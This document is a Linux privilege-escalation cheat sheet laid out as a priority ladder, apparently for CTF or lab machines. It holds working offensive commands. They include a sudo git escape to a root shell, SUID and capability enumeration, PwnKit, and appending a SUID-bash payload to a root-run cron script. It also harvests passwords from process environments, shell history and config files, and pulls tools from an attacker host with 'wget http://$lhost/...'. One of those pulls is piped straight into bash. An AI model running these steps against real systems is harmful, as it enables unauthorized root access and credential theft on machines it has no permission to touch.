title: Linux Privesc — Vector by Priority
body: Check vectors in order of deterministic+quiet → exploit+risky. sudo/GTFObins first (instant, no crash), then SUID/caps, then cron/service, then kernel LAST (can panic the box and kill your shell).
cmd:
# LINUX PRIVESC PRIORITY LADDER - check in THIS order, stop at first win.

# 1) SUDO RULE (quickest, zero risk) - ALWAYS first:
sudo -l
#   Any NOPASSWD entry? → GTFObins escape for that binary = instant root.
#   BEYOND: (ALL) NOPASSWD: /usr/bin/git → sudo git -p help → !/bin/bash
#   The moment you see a sudo rule, you can almost skip the rest.

# 2) SUID / CAPABILITIES (deterministic):
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
#   Match the binary on GTFObins → SUID escape.
#   pkexec SUID + CVE-2021-4034 annotated → PwnKit (reliable on unpatched boxes)

# 3) CRON / WRITABLE SCRIPT / WEAK SERVICE (misconfig, reliable):
cat /etc/crontab ; ls -la /etc/cron.*
# Can't read /var/spool/cron/crontabs/root directly — use two methods:
#
# Method A — INFERENCE (fast, no file transfer):
#   Find scripts in /opt/ or custom locations owned by YOU:
find /opt /var/scripts /home -user $(whoami) -type f 2>/dev/null
ls -la /opt/
#   Read the script — does it write to /root/ or /etc/?
#   cat /opt/suspicious.sh
#   If yes → root runs it (low-priv can't write /root/ directly)
#   → echo 'chmod u+s /bin/bash' >> /opt/suspicious.sh
#   → wait 60s → /bin/bash -p → root
#
# Method B — PSPY (definitive confirmation):
wget http://$lhost/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64 && /tmp/pspy64
#   Wait 2-3 minutes. Look for:
#   CMD: UID=0  PID=XXXX  | /bin/sh /opt/your-script.sh
#              ^^^^^        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#           root = UID 0    script path to target
#   Once confirmed → overwrite or append payload → wait → /bin/bash -p

# 4) PASSWORD REUSE — CHECK ENV FIRST (cheap, overlooked, high hit rate):
# App service env vars frequently reuse the OS root password:
grep -a 'password' /proc/*/environ 2>/dev/null | strings | grep -iv 'passwordless\|no.password'
# Found synchrony.database.password=X → try: su root → X
# Also check:
cat ~/.bash_history | grep -i 'pass\|su\|ssh'
find / -name "*.conf" -o -name "*.xml" -o -name "web.config" 2>/dev/null | xargs grep -il "password" 2>/dev/null
# Pattern: Confluence, Tomcat, Django, Rails → DB password = root password on lab boxes

# 5) KERNEL EXPLOIT - LAST RESORT:
#   linpeas flagged DirtyPipe, DirtyCow etc.
#   Kernel exploits can PANIC the host and kill your shell.
#   Only try after 1-4 are exhausted.
#   Check kernel version: uname -a
#   linux-exploit-suggester: wget http://$lhost/les.sh | bash
warn: linpeas dumps every candidate at once - that's noise, not a priority list. Work the ladder top-down: a NOPASSWD sudo rule beats a kernel CVE every time. Kernel exploits are last because they can crash the host.

choices.label: sudo -l has an entry — GTFObin it
sudo custom binary with gets() — Linux x64 ROP
